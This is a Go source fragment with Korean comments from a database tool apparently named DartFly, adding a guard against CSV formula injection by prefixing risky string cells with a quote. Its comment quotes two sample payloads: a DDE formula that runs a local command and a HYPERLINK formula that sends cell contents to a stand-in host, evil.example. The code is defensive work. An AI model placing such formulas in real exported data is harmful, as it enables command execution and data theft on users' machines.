import (
	"os"
	"strings"
)

// CSV 수식 주입 방지.
//
// 내려받은 CSV 는 대부분 Excel 에서 열립니다(DartFly 도 그 때문에 UTF-8 BOM 을 붙입니다).
// 그런데 Excel 은 셀 값이 =, +, -, @ 로 시작하면 수식으로 해석합니다. 조회 대상 DB 에
// 그런 값이 들어 있으면 그대로 실행됩니다.
//
// 실제로 확인한 값들입니다.
//
//	=cmd|'/c calc'!A1                                외부 명령 실행(DDE)
//	=HYPERLINK("http://evil.example/?d="&A1,"click")  누르면 셀 내용을 밖으로 보냄
//
// 조회 대상 DB 의 내용은 DartFly 가 통제하지 않습니다. 사용자가 입력한 값이 그대로
// 들어 있는 테이블을 조회해 내려받는 것이 이 도구의 일상적인 쓰임입니다.
//
// 값 앞에 작은따옴표를 붙여 Excel 이 문자로 다루게 합니다. Excel 은 이 따옴표를 화면에
// 보여 주지 않습니다. 다만 CSV 를 스크립트로 읽는 쪽에서는 값이 달라지므로
// DARTFLY_CSV_FORMULA_GUARD=off 로 끌 수 있습니다.
//
// **문자열 셀에만 적용합니다.** 숫자에 붙이면 -5 가 '-5 가 되어 계산이 깨집니다.
// 숫자는 애초에 수식으로 해석되지 않으므로 손댈 이유도 없습니다.

// csvFormulaGuardEnabled는 수식 방지를 켤지 판단합니다(기본 켜짐).
func csvFormulaGuardEnabled() bool {
	switch strings.ToLower(strings.TrimSpace(os.Getenv("DARTFLY_CSV_FORMULA_GUARD"))) {
	case "off", "false", "0", "no":
		return false
	}
	return true
}

// csvSafeCell은 수식으로 해석될 수 있는 문자열 앞에 작은따옴표를 붙입니다.
func csvSafeCell(value string) string {
	if value == "" || !csvFormulaGuardEnabled() {
		return value
	}
	// 앞쪽 공백·탭·개행을 건너뛰고 첫 글자를 봅니다. Excel 은 앞 공백을 무시하고
	// 수식으로 읽는 경우가 있어, 공백을 끼워 우회하는 것을 막습니다.
	trimmed := strings.TrimLeft(value, " \t\r\n")
	if trimmed == "" {
		return value
	}
	switch trimmed[0] {
	case '=', '+', '-', '@':
		return "'" + value
	}
	return value
}

// csvCell은 결과 셀 하나를 CSV 값으로 바꿉니다.
// 문자열만 수식 방지 대상입니다(숫자·불리언은 그대로).
func csvCell(value any) string {
	if value == nil {
		return ""
	}
	if text, ok := value.(string); ok {
		return csvSafeCell(text)
	}
	return cellString(value)
}
